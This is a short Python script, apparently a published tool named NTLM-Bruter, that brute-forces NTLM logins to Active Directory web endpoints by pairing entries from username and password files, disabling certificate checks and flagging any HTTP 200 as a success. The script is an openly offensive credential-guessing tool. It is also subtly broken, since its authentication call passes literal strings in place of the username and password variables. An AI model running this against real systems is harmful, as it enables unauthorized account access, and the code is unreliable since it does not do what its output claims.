#!/usr/bin/python
print ("""
███╗░░██╗████████╗██╗░░░░░███╗░░░███╗░░░░░░██████╗░██████╗░██╗░░░██╗████████╗███████╗██████╗░
████╗░██║╚══██╔══╝██║░░░░░████╗░████║░░░░░░██╔══██╗██╔══██╗██║░░░██║╚══██╔══╝██╔════╝██╔══██╗
██╔██╗██║░░░██║░░░██║░░░░░██╔████╔██║█████╗██████╦╝██████╔╝██║░░░██║░░░██║░░░█████╗░░██████╔╝
██║╚████║░░░██║░░░██║░░░░░██║╚██╔╝██║╚════╝██╔══██╗██╔══██╗██║░░░██║░░░██║░░░██╔══╝░░██╔══██╗
██║░╚███║░░░██║░░░███████╗██║░╚═╝░██║░░░░░░██████╦╝██║░░██║╚██████╔╝░░░██║░░░███████╗██║░░██║
╚═╝░░╚══╝░░░╚═╝░░░╚══════╝╚═╝░░░░░╚═╝░░░░░░╚═════╝░╚═╝░░╚═╝░╚═════╝░░░░╚═╝░░░╚══════╝╚═╝░░╚═╝

Developed by: @smaranchand | https://smaranchand.com.np
""")
import sys
import urllib3
import requests
from requests_ntlm2 import HttpNtlmAuth
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

try:
    print('Usage: python ntlm.py [URL] [AD Domain Name]')
    url = sys.argv[1]
    ad_domain = sys.argv[2]
    ad_domain_w = ad_domain+'\\'
    with open('usernames.txt') as f:
        usernames = ', '.join(f.read().splitlines()).split(', ')
    with open('passwords.txt') as f:
        for i in f:
            for passwords in i.strip().split(', '):
                for user in usernames:
                    print("Trying: " + ad_domain_w + user + ":" + passwords)
                    auth=HttpNtlmAuth('ad_domain_w\\user','passwords')
                    response=requests.get(url, auth=auth, verify=False)
                    if response.status_code == 200:
                        print ("SUCCESS: %s\%s - %s" % (ad_domain, user, passwords))
except (IndexError, TypeError):
    print('Error: Please provide a valid URL and AD Domain Name')
